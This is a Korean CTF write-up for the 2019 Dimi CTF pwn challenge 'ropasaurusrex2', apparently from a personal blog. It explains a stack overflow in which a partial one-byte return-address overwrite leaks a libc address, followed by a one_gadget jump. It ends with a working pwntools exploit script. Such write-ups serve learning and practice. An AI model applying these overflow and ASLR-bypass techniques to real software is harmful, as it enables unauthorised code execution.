---
title: "2019 Dimi CTF ropasaurusrex2"
date: 2020-1-7
tags: [dimi]
categories: [Dimi]
---

Full RELRO, NX, PIE가 걸려있는 바이너리다.

```
[*] '/vagrant/ctfs/ropasaurusrex2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

메인을 보면 buf가 `rbp-0x30` 위치에 있는데 64만큼 입력받으면 리턴까지밖에 덮지 못한다. 근데 입력받은만큼 buf를 write해준다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  char buf; // [rsp+0h] [rbp-30h]

  init();
  read(0, &buf, 64uLL);
  v3 = strlen(&buf);
  write(1, &buf, v3);
  return 0;
}
```

main에서 ret을 보면 `__libc_start_main + 240` 의 주소가 저장되는데 이를 이용해서 1byte overwrite해서 `__libc_start_main + 233` main을 call하는 곳으로 ret해주면 된다.  

그러면 `__libc_start_main + 233` 주소가 leak될 것이고 다시 메인으로 돌아오니까 리턴을 oneshot으로 덮어주면 된다. 

![](https://user-images.githubusercontent.com/32904385/71875041-be753900-3166-11ea-902c-a24dccb592f0.png)

rsp+0x18에는 메인주소가 담겨져있고 주소로 +238에서 call해준다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
e = ELF('./ropasaurusrex2')
p = process('./ropasaurusrex2')
libc = e.libc

payload = 'A'*0x30
payload += 'realsung'
payload += '\x29'

p.send(payload)

libc_base = u64(p.recvuntil('\x7f')[-6:]+'\x00\x00') - (libc.symbols['__libc_start_main'] + 233)
log.info('libc_base : ' + hex(libc_base))

payload2 = 'A'*(0x30)
payload2 += 'realsung'
payload2 += p64(libc_base + 0x45216)

p.send(payload2)

p.interactive()
```



